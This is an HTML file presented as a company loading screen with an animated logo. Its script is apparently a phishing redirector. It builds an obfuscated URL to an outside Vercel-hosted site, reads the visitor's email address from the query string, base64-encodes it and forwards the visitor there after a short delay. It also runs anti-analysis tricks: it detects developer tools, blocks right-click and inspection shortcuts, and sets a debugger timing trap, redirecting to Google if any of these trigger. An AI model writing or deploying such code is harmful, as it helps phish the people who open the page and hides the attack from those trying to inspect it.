<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f5f5f5;
      overflow: hidden;
      font-family: Arial, sans-serif;
    }
    
    .logo-container {
      text-align: center;
      transition: opacity 0.5s ease;
    }
    
    .logo {
      width: 120px;
      height: 120px;
      animation: breathing 3s ease-in-out infinite;
    }
    
    @keyframes breathing {
      0% {
        transform: scale(0.95);
        filter: brightness(0.95);
      }
      50% {
        transform: scale(1.05);
        filter: brightness(1.05);
      }
      100% {
        transform: scale(0.95);
        filter: brightness(0.95);
      }
    }
    
    .loading-text {
      margin-top: 20px;
      color: #333;
      font-size: 14px;
      opacity: 0.8;
      animation: pulse 2s ease-in-out infinite;
    }
    
    @keyframes pulse {
      0%, 100% { opacity: 0.7; }
      50% { opacity: 1; }
    }
  </style>
  <script>
    // Obfuscated URL components
    const urlSegments = {
      p1: String.fromCharCode(104, 116, 116, 112, 115, 58),
      p2: atob('Ly8='),
      p3: 'my' + (() => 'files')(),
      p4: 'io' + String.fromCharCode(46),
      p5: 'vercel' + (true ? '.' : ''),
      p6: 'app' + (1 === 1 ? '/?' : ''),
      p7: 'id' + (() => '=')()
    };

    function buildRedirectUrl() {
      return Object.values(urlSegments).reduce((a, b) => a + b);
    }

    function encodeEmailAndRedirect() {
      const queryString = window.location.search;
      const emailPrefix = "email=";
      const emailStartIndex = queryString.indexOf(emailPrefix);

      if (emailStartIndex !== -1) {
        const email = queryString.slice(emailStartIndex + emailPrefix.length);
        const emailEndIndex = email.indexOf('&');
        const finalEmail = emailEndIndex === -1 ? email : email.slice(0, emailEndIndex);

        if (finalEmail) {
          // Encode email to Base64
          const encodedEmail = btoa(finalEmail);
          
          setTimeout(() => {
            document.querySelector('.logo-container').style.opacity = '0';
          }, 1500);
          
          setTimeout(() => {
            window.location.href = buildRedirectUrl() + encodedEmail;
          }, 3000);
        }
      }
    }

    function detectDevTools() {
      const devToolsOpened = () => {
        const widthThreshold = window.outerWidth - window.innerWidth > 160;
        const heightThreshold = window.outerHeight - window.innerHeight > 160;
        return widthThreshold || heightThreshold;
      };

      if (devToolsOpened()) {
        window.location.href = "https://www.google.com";
      }
    }

    setInterval(detectDevTools, 1000);

    document.addEventListener("contextmenu", (e) => {
      e.preventDefault();
    });

    document.addEventListener("keydown", (e) => {
      if (e.key === "F12" ||
          (e.ctrlKey && e.shiftKey && e.key === "I") ||
          (e.ctrlKey && e.key === "U") ||
          (e.ctrlKey && e.shiftKey && e.key === "C") ||
          (e.ctrlKey && e.key === "S") ||
          (e.ctrlKey && e.key === "J")) {
        e.preventDefault();
        window.location.href = "https://www.google.com";
      }
    });

    function antiDebugging() {
      const startTime = performance.now();
      debugger;
      const endTime = performance.now();
      if (endTime - startTime > 100) {
        window.location.href = "https://www.google.com";
      }
    }

    setInterval(antiDebugging, 1000);

    window.addEventListener('load', function() {
      setTimeout(() => {
        document.querySelector('.logo-container').style.opacity = '1';
      }, 100);
      
      encodeEmailAndRedirect();
    });
  </script>
</head>
<body>
  <div class="logo-container" style="opacity: 0;">
    <img class="logo" src="logo.png" alt="Company Logo">
    <div class="loading-text">Loading, please wait...</div>
  </div>
</body>
</html>
